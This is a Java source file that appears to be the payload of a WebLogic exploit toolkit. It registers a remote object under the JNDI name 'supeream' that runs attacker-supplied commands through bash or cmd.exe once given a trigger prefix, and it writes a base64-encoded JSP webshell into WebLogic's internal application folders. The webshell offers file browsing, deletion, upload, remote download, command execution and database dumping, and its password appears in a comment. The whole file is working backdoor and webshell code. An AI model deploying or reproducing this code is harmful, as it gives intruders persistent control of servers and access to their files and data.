package com.supeream.payload;

import sun.tools.asm.TryData;
import weblogic.cluster.singleton.ClusterMasterRemote;
import weblogic.utils.encoders.BASE64Decoder;

import javax.naming.Context;
import javax.naming.InitialContext;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStreamReader;
import java.rmi.RemoteException;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;

/**
 * Created by nike on 17/6/27.
 */

public class RemoteImpl implements ClusterMasterRemote {

    public static void main(String[] args) {

        try {
            RemoteImpl remote = new RemoteImpl();

            if (args.length == 2 && args[0].equalsIgnoreCase("blind")) {
                remote.getServerLocation(args[1]);
            } else if (args.length == 1) {
                Context ctx = new InitialContext();
                if (args[0].equalsIgnoreCase("install")) {
                    ctx.rebind("supeream", remote);
                } else if (args[0].equalsIgnoreCase("uninstall")) {
                    ctx.unbind("supeream");
                }
            }
        } catch (Exception e) {

        }
    }


    @Override
    public void setServerLocation(String cmd, String args) throws RemoteException {

    }

    public static void uploadFile(String path, byte[] content) {
        try {
            FileOutputStream fileOutputStream = new FileOutputStream(path);
            fileOutputStream.write(content);
            fileOutputStream.flush();
            fileOutputStream.close();
        }catch (Exception e) {

        }
    }

    public static void uploadFileShell(String fileName) {
        try {
            String evil = "PCVAcGFnZSBpbXBvcnQ9ImphdmEuaW8uKixqYXZhLnV0aWwuKixqYXZhLm5ldC4qLGphdmEuc3FsLiosamF2YS50ZXh0LioiJT48JSFTdHJpbmcgUHdkPSJxaXNoaXdvc2hpeWlnZWhhb3JlbiI7U3RyaW5nIGNzPSJVVEYtOCI7U3RyaW5nIEVDKFN0cmluZyBzKXRocm93cyBFeGNlcHRpb257cmV0dXJuIG5ldyBTdHJpbmcocy5nZXRCeXRlcygiSVNPLTg4NTktMSIpLGNzKTt9Q29ubmVjdGlvbiBHQyhTdHJpbmcgcyl0aHJvd3MgRXhjZXB0aW9ue1N0cmluZ1tdIHg9cy50cmltKCkuc3BsaXQoIlxyXG4iKTtDbGFzcy5mb3JOYW1lKHhbMF0udHJpbSgpKTtpZih4WzFdLmluZGV4T2YoImpkYmM6b3JhY2xlIikhPS0xKXtyZXR1cm4gRHJpdmVyTWFuYWdlci5nZXRDb25uZWN0aW9uKHhbMV0udHJpbSgpKyI6Iit4WzRdLHhbMl0uZXF1YWxzSWdub3JlQ2FzZSgiWy9udWxsXSIpPyIiOnhbMl0seFszXS5lcXVhbHNJZ25vcmVDYXNlKCJbL251bGxdIik/IiI6eFszXSk7fWVsc2V7Q29ubmVjdGlvbiBjPURyaXZlck1hbmFnZXIuZ2V0Q29ubmVjdGlvbih4WzFdLnRyaW0oKSx4WzJdLmVxdWFsc0lnbm9yZUNhc2UoIlsvbnVsbF0iKT8iIjp4WzJdLHhbM10uZXF1YWxzSWdub3JlQ2FzZSgiWy9udWxsXSIpPyIiOnhbM10pO2lmKHgubGVuZ3RoPjQpe2Muc2V0Q2F0YWxvZyh4WzRdKTt9cmV0dXJuIGM7fX12b2lkIEFBKFN0cmluZ0J1ZmZlciBzYil0aHJvd3MgRXhjZXB0aW9ue0ZpbGUgcltdPUZpbGUubGlzdFJvb3RzKCk7Zm9yKGludCBpPTA7aTxyLmxlbmd0aDtpKyspe3NiLmFwcGVuZChyW2ldLnRvU3RyaW5nKCkuc3Vic3RyaW5nKDAsMikpO319dm9pZCBCQihTdHJpbmcgcyxTdHJpbmdCdWZmZXIgc2IpdGhyb3dzIEV4Y2VwdGlvbntGaWxlIG9GPW5ldyBGaWxlKHMpLGxbXT1vRi5saXN0RmlsZXMoKTtTdHJpbmcgc1Qsc1Esc0Y9IiI7amF2YS51dGlsLkRhdGUgZHQ7U2ltcGxlRGF0ZUZvcm1hdCBmbT1uZXcgU2ltcGxlRGF0ZUZvcm1hdCgieXl5eS1NTS1kZCBISDptbTpzcyIpO2ZvcihpbnQgaT0wOyBpPGwubGVuZ3RoOyBpKyspe2R0PW5ldyBqYXZhLnV0aWwuRGF0ZShsW2ldLmxhc3RNb2RpZmllZCgpKTtzVD1mbS5mb3JtYXQoZHQpO3NRPWxbaV0uY2FuUmVhZCgpPyJSIjoiIjtzUSArPWxbaV0uY2FuV3JpdGUoKT8iIFciOiIiO2lmKGxbaV0uaXNEaXJlY3RvcnkoKSl7c2IuYXBwZW5kKGxbaV0uZ2V0TmFtZSgpKyIvXHQiK3NUKyJcdCIrbFtpXS5sZW5ndGgoKSsiXHQiK3NRKyJcbiIpO31lbHNle3NGKz1sW2ldLmdldE5hbWUoKSsiXHQiK3NUKyJcdCIrbFtpXS5sZW5ndGgoKSsiXHQiK3NRKyJcbiI7fX1zYi5hcHBlbmQoc0YpO312b2lkIEVFKFN0cmluZyBzKXRocm93cyBFeGNlcHRpb257RmlsZSBmPW5ldyBGaWxlKHMpO2lmKGYuaXNEaXJlY3RvcnkoKSl7RmlsZSB4W109Zi5saXN0RmlsZXMoKTtmb3IoaW50IGs9MDsgayA8IHgubGVuZ3RoOyBrKyspe2lmKCF4W2tdLmRlbGV0ZSgpKXtFRSh4W2tdLmdldFBhdGgoKSk7fX19Zi5kZWxldGUoKTt9dm9pZCBGRihTdHJpbmcgcyxIdHRwU2VydmxldFJlc3BvbnNlIHIpdGhyb3dzIEV4Y2VwdGlvbntpbnQgbjtieXRlW10gYj1uZXcgYnl0ZVs1MTJdO3IucmVzZXQoKTtTZXJ2bGV0T3V0cHV0U3RyZWFtIG9zPXIuZ2V0T3V0cHV0U3RyZWFtKCk7QnVmZmVyZWRJbnB1dFN0cmVhbSBpcz1uZXcgQnVmZmVyZWRJbnB1dFN0cmVhbShuZXcgRmlsZUlucHV0U3RyZWFtKHMpKTtvcy53cml0ZSgoIi0+IisifCIpLmdldEJ5dGVzKCksMCwzKTt3aGlsZSgobj1pcy5yZWFkKGIsMCw1MTIpKSE9LTEpe29zLndyaXRlKGIsMCxuKTt9b3Mud3JpdGUoKCJ8IisiPC0iKS5nZXRCeXRlcygpLDAsMyk7b3MuY2xvc2UoKTtpcy5jbG9zZSgpO312b2lkIEdHKFN0cmluZyBzLFN0cmluZyBkKXRocm93cyBFeGNlcHRpb257U3RyaW5nIGg9IjAxMjM0NTY3ODlBQkNERUYiO0ZpbGUgZj1uZXcgRmlsZShzKTtmLmNyZWF0ZU5ld0ZpbGUoKTtGaWxlT3V0cHV0U3RyZWFtIG9zPW5ldyBGaWxlT3V0cHV0U3RyZWFtKGYpO2ZvcihpbnQgaT0wOyBpPGQubGVuZ3RoKCk7aSs9Mil7b3Mud3JpdGUoKGguaW5kZXhPZihkLmNoYXJBdChpKSkgPDwgNCB8IGguaW5kZXhPZihkLmNoYXJBdChpKzEpKSkpO31vcy5jbG9zZSgpO312b2lkIEhIKFN0cmluZyBzLFN0cmluZyBkKXRocm93cyBFeGNlcHRpb257RmlsZSBzZj1uZXcgRmlsZShzKSxkZj1uZXcgRmlsZShkKTtpZihzZi5pc0RpcmVjdG9yeSgpKXtpZighZGYuZXhpc3RzKCkpe2RmLm1rZGlyKCk7fUZpbGUgeltdPXNmLmxpc3RGaWxlcygpO2ZvcihpbnQgaj0wOyBqPHoubGVuZ3RoOyBqKyspe0hIKHMrIi8iK3pbal0uZ2V0TmFtZSgpLGQrIi8iK3pbal0uZ2V0TmFtZSgpKTt9fWVsc2V7RmlsZUlucHV0U3RyZWFtIGlzPW5ldyBGaWxlSW5wdXRTdHJlYW0oc2YpO0ZpbGVPdXRwdXRTdHJlYW0gb3M9bmV3IEZpbGVPdXRwdXRTdHJlYW0oZGYpO2ludCBuO2J5dGVbXSBiPW5ldyBieXRlWzUxMl07d2hpbGUoKG49aXMucmVhZChiLDAsNTEyKSkhPS0xKXtvcy53cml0ZShiLDAsbik7fWlzLmNsb3NlKCk7b3MuY2xvc2UoKTt9fXZvaWQgSUkoU3RyaW5nIHMsU3RyaW5nIGQpdGhyb3dzIEV4Y2VwdGlvbntGaWxlIHNmPW5ldyBGaWxlKHMpLGRmPW5ldyBGaWxlKGQpO3NmLnJlbmFtZVRvKGRmKTt9dm9pZCBKSihTdHJpbmcgcyl0aHJvd3MgRXhjZXB0aW9ue0ZpbGUgZj1uZXcgRmlsZShzKTtmLm1rZGlyKCk7fXZvaWQgS0soU3RyaW5nIHMsU3RyaW5nIHQpdGhyb3dzIEV4Y2VwdGlvbntGaWxlIGY9bmV3IEZpbGUocyk7U2ltcGxlRGF0ZUZvcm1hdCBmbT1uZXcgU2ltcGxlRGF0ZUZvcm1hdCgieXl5eS1NTS1kZCBISDptbTpzcyIpO2phdmEudXRpbC5EYXRlIGR0PWZtLnBhcnNlKHQpO2Yuc2V0TGFzdE1vZGlmaWVkKGR0LmdldFRpbWUoKSk7fXZvaWQgTEwoU3RyaW5nIHMsU3RyaW5nIGQpdGhyb3dzIEV4Y2VwdGlvbntVUkwgdT1uZXcgVVJMKHMpO2ludCBuPTA7RmlsZU91dHB1dFN0cmVhbSBvcz1uZXcgRmlsZU91dHB1dFN0cmVhbShkKTtIdHRwVVJMQ29ubmVjdGlvbiBoPShIdHRwVVJMQ29ubmVjdGlvbikgdS5vcGVuQ29ubmVjdGlvbigpO0lucHV0U3RyZWFtIGlzPWguZ2V0SW5wdXRTdHJlYW0oKTtieXRlW10gYj1uZXcgYnl0ZVs1MTJdO3doaWxlKChuPWlzLnJlYWQoYikpIT0tMSl7b3Mud3JpdGUoYiwwLG4pO31vcy5jbG9zZSgpO2lzLmNsb3NlKCk7aC5kaXNjb25uZWN0KCk7fXZvaWQgTU0oSW5wdXRTdHJlYW0gaXMsU3RyaW5nQnVmZmVyIHNiKXRocm93cyBFeGNlcHRpb257U3RyaW5nIGw7QnVmZmVyZWRSZWFkZXIgYnI9bmV3IEJ1ZmZlcmVkUmVhZGVyKG5ldyBJbnB1dFN0cmVhbVJlYWRlcihpcykpO3doaWxlKChsPWJyLnJlYWRMaW5lKCkpIT1udWxsKXtzYi5hcHBlbmQobCsiXHJcbiIpO319dm9pZCBOTihTdHJpbmcgcyxTdHJpbmdCdWZmZXIgc2IpdGhyb3dzIEV4Y2VwdGlvbntDb25uZWN0aW9uIGM9R0Mocyk7UmVzdWx0U2V0IHI9cy5pbmRleE9mKCJqZGJjOm9yYWNsZSIpIT0tMT9jLmdldE1ldGFEYXRhKCkuZ2V0U2NoZW1hcygpOmMuZ2V0TWV0YURhdGEoKS5nZXRDYXRhbG9ncygpO3doaWxlKHIubmV4dCgpKXtzYi5hcHBlbmQoci5nZXRTdHJpbmcoMSkrIlx0Iik7fXIuY2xvc2UoKTtjLmNsb3NlKCk7fXZvaWQgT08oU3RyaW5nIHMsU3RyaW5nQnVmZmVyIHNiKXRocm93cyBFeGNlcHRpb257Q29ubmVjdGlvbiBjPUdDKHMpO1N0cmluZ1tdIHg9cy50cmltKCkuc3BsaXQoIlxyXG4iKTtSZXN1bHRTZXQgcj1jLmdldE1ldGFEYXRhKCkuZ2V0VGFibGVzKG51bGwscy5pbmRleE9mKCJqZGJjOm9yYWNsZSIpIT0tMT94Lmxlbmd0aD41P3hbNV06eFs0XTpudWxsLCIlIixuZXcgU3RyaW5nW117IlRBQkxFIn0pO3doaWxlKHIubmV4dCgpKXtzYi5hcHBlbmQoci5nZXRTdHJpbmcoIlRBQkxFX05BTUUiKSsiXHQiKTt9ci5jbG9zZSgpO2MuY2xvc2UoKTt9dm9pZCBQUChTdHJpbmcgcyxTdHJpbmdCdWZmZXIgc2IpdGhyb3dzIEV4Y2VwdGlvbntTdHJpbmdbXSB4PXMudHJpbSgpLnNwbGl0KCJcclxuIik7Q29ubmVjdGlvbiBjPUdDKHMpO1N0YXRlbWVudCBtPWMuY3JlYXRlU3RhdGVtZW50KDEwMDUsMTAwNyk7UmVzdWx0U2V0IHI9bS5leGVjdXRlUXVlcnkoInNlbGVjdCAqIGZyb20gIit4W3gubGVuZ3RoLTFdKTtSZXN1bHRTZXRNZXRhRGF0YSBkPXIuZ2V0TWV0YURhdGEoKTtmb3IoaW50IGk9MTtpPD1kLmdldENvbHVtbkNvdW50KCk7aSsrKXtzYi5hcHBlbmQoZC5nZXRDb2x1bW5OYW1lKGkpKyIgKCIrZC5nZXRDb2x1bW5UeXBlTmFtZShpKSsiKVx0Iik7fXIuY2xvc2UoKTttLmNsb3NlKCk7Yy5jbG9zZSgpO312b2lkIFFRKFN0cmluZyBjcyxTdHJpbmcgcyxTdHJpbmcgcSxTdHJpbmdCdWZmZXIgc2IsU3RyaW5nIHApdGhyb3dzIEV4Y2VwdGlvbntDb25uZWN0aW9uIGM9R0Mocyk7U3RhdGVtZW50IG09Yy5jcmVhdGVTdGF0ZW1lbnQoMTAwNSwxMDA4KTtCdWZmZXJlZFdyaXRlciBidzE9bnVsbDt0cnl7UmVzdWx0U2V0IHI9bS5leGVjdXRlUXVlcnkocS5pbmRleE9mKCItLWY6IikhPS0xP3Euc3Vic3RyaW5nKDAscS5pbmRleE9mKCItLWY6IikpOnEpO1Jlc3VsdFNldE1ldGFEYXRhIGQ9ci5nZXRNZXRhRGF0YSgpO2ludCBuPWQuZ2V0Q29sdW1uQ291bnQoKTtmb3IoaW50IGk9MTsgaSA8PW47IGkrKyl7c2IuYXBwZW5kKGQuZ2V0Q29sdW1uTmFtZShpKSsiXHR8XHQiKTt9c2IuYXBwZW5kKCJcclxuIik7aWYocS5pbmRleE9mKCItLWY6IikhPS0xKXtGaWxlIGZpbGU9bmV3IEZpbGUocCk7aWYocS5pbmRleE9mKCItdG86Iik9PS0xKXtmaWxlLm1rZGlyKCk7fWJ3MT1uZXcgQnVmZmVyZWRXcml0ZXIobmV3IE91dHB1dFN0cmVhbVdyaXRlcihuZXcgRmlsZU91dHB1dFN0cmVhbShuZXcgRmlsZShxLmluZGV4T2YoIi10bzoiKSE9LTE/cC50cmltKCk6cCtxLnN1YnN0cmluZyhxLmluZGV4T2YoIi0tZjoiKSs0LHEubGVuZ3RoKCkpLnRyaW0oKSksdHJ1ZSksY3MpKTt9d2hpbGUoci5uZXh0KCkpe2ZvcihpbnQgaT0xOyBpPD1uO2krKyl7aWYocS5pbmRleE9mKCItLWY6IikhPS0xKXtidzEud3JpdGUoci5nZXRPYmplY3QoaSkrIiIrIlx0Iik7YncxLmZsdXNoKCk7fWVsc2V7c2IuYXBwZW5kKHIuZ2V0T2JqZWN0KGkpKyIiKyJcdHxcdCIpO319aWYoYncxIT1udWxsKXtidzEubmV3TGluZSgpO31zYi5hcHBlbmQoIlxyXG4iKTt9ci5jbG9zZSgpO2lmKGJ3MSE9bnVsbCl7YncxLmNsb3NlKCk7fX1jYXRjaChFeGNlcHRpb24gZSl7c2IuYXBwZW5kKCJSZXN1bHRcdHxcdFxyXG4iKTt0cnl7bS5leGVjdXRlVXBkYXRlKHEpO3NiLmFwcGVuZCgiRXhlY3V0ZSBTdWNjZXNzZnVsbHkhXHR8XHRcclxuIik7fWNhdGNoKEV4Y2VwdGlvbiBlZSl7c2IuYXBwZW5kKGVlLnRvU3RyaW5nKCkrIlx0fFx0XHJcbiIpO319bS5jbG9zZSgpO2MuY2xvc2UoKTt9JT48JWNzPXJlcXVlc3QuZ2V0UGFyYW1ldGVyKCJ6MCIpIT1udWxsP3JlcXVlc3QuZ2V0UGFyYW1ldGVyKCJ6MCIpKyIiOmNzO3Jlc3BvbnNlLnNldENvbnRlbnRUeXBlKCJ0ZXh0L2h0bWwiKTtyZXNwb25zZS5zZXRDaGFyYWN0ZXJFbmNvZGluZyhjcyk7U3RyaW5nQnVmZmVyIHNiPW5ldyBTdHJpbmdCdWZmZXIoIiIpO3RyeXtTdHJpbmcgWj1FQyhyZXF1ZXN0LmdldFBhcmFtZXRlcihQd2QpKyIiKTtTdHJpbmcgejE9RUMocmVxdWVzdC5nZXRQYXJhbWV0ZXIoInoxIikrIiIpO1N0cmluZyB6Mj1FQyhyZXF1ZXN0LmdldFBhcmFtZXRlcigiejIiKSsiIik7c2IuYXBwZW5kKCItPiIrInwiKTtTdHJpbmcgcz1yZXF1ZXN0LmdldFNlc3Npb24oKS5nZXRTZXJ2bGV0Q29udGV4dCgpLmdldFJlc291cmNlKCIvIikuZ2V0RmlsZSgpO2lmKFouZXF1YWxzKCJBIikpe3NiLmFwcGVuZChzKyJcdCIpO2lmKCFzLnN1YnN0cmluZygwLDEpLmVxdWFscygiLyIpKXtBQShzYik7fX1lbHNlIGlmKFouZXF1YWxzKCJCIikpe0JCKHoxLHNiKTt9ZWxzZSBpZihaLmVxdWFscygiQyIpKXtTdHJpbmcgbD0iIjtCdWZmZXJlZFJlYWRlciBicj1uZXcgQnVmZmVyZWRSZWFkZXIobmV3IElucHV0U3RyZWFtUmVhZGVyKG5ldyBGaWxlSW5wdXRTdHJlYW0obmV3IEZpbGUoejEpKSkpO3doaWxlKChsPWJyLnJlYWRMaW5lKCkpIT1udWxsKXtzYi5hcHBlbmQobCsiXHJcbiIpO31ici5jbG9zZSgpO31lbHNlIGlmKFouZXF1YWxzKCJEIikpe0J1ZmZlcmVkV3JpdGVyIGJ3Mj1uZXcgQnVmZmVyZWRXcml0ZXIobmV3IE91dHB1dFN0cmVhbVdyaXRlcihuZXcgRmlsZU91dHB1dFN0cmVhbShuZXcgRmlsZSh6MSkpKSk7YncyLndyaXRlKHoyKTtidzIuY2xvc2UoKTtzYi5hcHBlbmQoIjEiKTt9ZWxzZSBpZihaLmVxdWFscygiRSIpKXtFRSh6MSk7c2IuYXBwZW5kKCIxIik7fWVsc2UgaWYoWi5lcXVhbHMoIkYiKSl7RkYoejEscmVzcG9uc2UpO31lbHNlIGlmKFouZXF1YWxzKCJHIikpe0dHKHoxLHoyKTtzYi5hcHBlbmQoIjEiKTt9ZWxzZSBpZihaLmVxdWFscygiSCIpKXtISCh6MSx6Mik7c2IuYXBwZW5kKCIxIik7fWVsc2UgaWYoWi5lcXVhbHMoIkkiKSl7SUkoejEsejIpO3NiLmFwcGVuZCgiMSIpO31lbHNlIGlmKFouZXF1YWxzKCJKIikpe0pKKHoxKTtzYi5hcHBlbmQoIjEiKTt9ZWxzZSBpZihaLmVxdWFscygiSyIpKXtLSyh6MSx6Mik7c2IuYXBwZW5kKCIxIik7fWVsc2UgaWYoWi5lcXVhbHMoIkwiKSl7TEwoejEsejIpO3NiLmFwcGVuZCgiMSIpO31lbHNlIGlmKFouZXF1YWxzKCJNIikpe1N0cmluZ1tdIGM9e3oxLnN1YnN0cmluZygyKSx6MS5zdWJzdHJpbmcoMCwyKSx6Mn07UHJvY2VzcyBwPVJ1bnRpbWUuZ2V0UnVudGltZSgpLmV4ZWMoYyk7TU0ocC5nZXRJbnB1dFN0cmVhbSgpLHNiKTtNTShwLmdldEVycm9yU3RyZWFtKCksc2IpO31lbHNlIGlmKFouZXF1YWxzKCJOIikpe05OKHoxLHNiKTt9ZWxzZSBpZihaLmVxdWFscygiTyIpKXtPTyh6MSxzYik7fWVsc2UgaWYoWi5lcXVhbHMoIlAiKSl7UFAoejEsc2IpO31lbHNlIGlmKFouZXF1YWxzKCJRIikpe1FRKGNzLHoxLHoyLHNiLHoyLmluZGV4T2YoIi10bzoiKSE9LTE/ejIuc3Vic3RyaW5nKHoyLmluZGV4T2YoIi10bzoiKSs0LHoyLmxlbmd0aCgpKTpzLnJlcGxhY2VBbGwoIlxcXFwiLCIvIikrImltYWdlcy8iKTt9fWNhdGNoKEV4Y2VwdGlvbiBlKXtlLnByaW50U3RhY2tUcmFjZSgpO3NiLmFwcGVuZCgiRVJST1IiKyI6Ly8gIityZXF1ZXN0LmdldFNlc3Npb24oKS5nZXRTZXJ2bGV0Q29udGV4dCgpLmdldFJlc291cmNlKCIvIikuZ2V0RmlsZSgpKyJ4eCIrZS50b1N0cmluZygpKTt9c2IuYXBwZW5kKCJ8IisiPC0iKTtvdXQucHJpbnQoc2IudG9TdHJpbmcoKSk7JT4=";
            String dir = "./servers/AdminServer/tmp/_WL_internal/bea_wls_internal/";
            File file = new File(dir);
            if (file.exists()) {
                String[] names = file.list();
                for (String name:names) {
                    String path = dir+name+"/war/"+fileName+".jsp";
                    FileOutputStream fileOutputStream = new FileOutputStream(path);
                    //passwd qishiwoshiyigehaoren
                    fileOutputStream.write(new BASE64Decoder().decodeBuffer(evil));
                    fileOutputStream.flush();
                    fileOutputStream.close();
                }
            }

        }catch (Exception e) {

        }
    }


    @Override
    public String getServerLocation(String cmd) throws RemoteException {
        try {

            if (!cmd.startsWith("showmecode")) {
                return "guess me?";
            } else {
                cmd = cmd.substring(10);
            }

            boolean isLinux = true;
            String osTyp = System.getProperty("os.name");
            if (osTyp != null && osTyp.toLowerCase().contains("win")) {
                isLinux = false;
            }

            List<String> cmds = new ArrayList<String>();

            if (cmd.startsWith("$NO$")) {
                cmds.add(cmd.substring(4));
            }else if (isLinux) {
                cmds.add("/bin/bash");
                cmds.add("-c");
                cmds.add(cmd);
            } else {
                cmds.add("cmd.exe");
                cmds.add("/c");
                cmds.add(cmd);
            }

            ProcessBuilder processBuilder = new ProcessBuilder(cmds);
            processBuilder.redirectErrorStream(true);
            Process proc = processBuilder.start();

            BufferedReader br = new BufferedReader(new InputStreamReader(proc.getInputStream()));
            StringBuffer sb = new StringBuffer();

            String line;
            while ((line = br.readLine()) != null) {
                sb.append(line).append("\n");
            }

            return sb.toString();
        } catch (Exception e) {
            return e.getMessage();
        }
    }
}
